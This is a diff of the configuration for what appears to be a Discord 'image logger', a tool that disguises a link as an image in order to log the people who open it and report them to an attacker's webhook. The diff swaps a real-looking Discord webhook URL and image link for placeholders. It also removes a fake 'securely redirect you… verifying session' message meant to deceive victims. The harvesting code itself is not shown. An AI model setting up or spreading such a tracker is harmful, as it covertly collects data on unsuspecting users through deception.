@@ -12,8 +12,8 @@ __author__ = "gtapiGOtLOXP"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1472653427283591311/WPNGcI2ObtE8EwtBGWUVDsf_1R0tTQKtRKI8Suu3UCDD4H7u1nrKwSrnP4fnToA01SWZ",
-    "image": "https://i.ytimg.com/vi/tKaDTjLzL4w/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLDdz8xBaradmSYuo7iv-2iEgOmZlg", # You can also have a custom image by using a URL argument
+    "webhook": "webhooklinkherer",
+    "image": "imagelinkhere", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,10 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": '''Please wait while we securely redirect you to the tenor dashboard... (Verifying session)
-        → Authenticating user 
-        → Loading personalized content... 
-        (Do not refresh!)''', # Message to show
+        "message": "messagehere", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
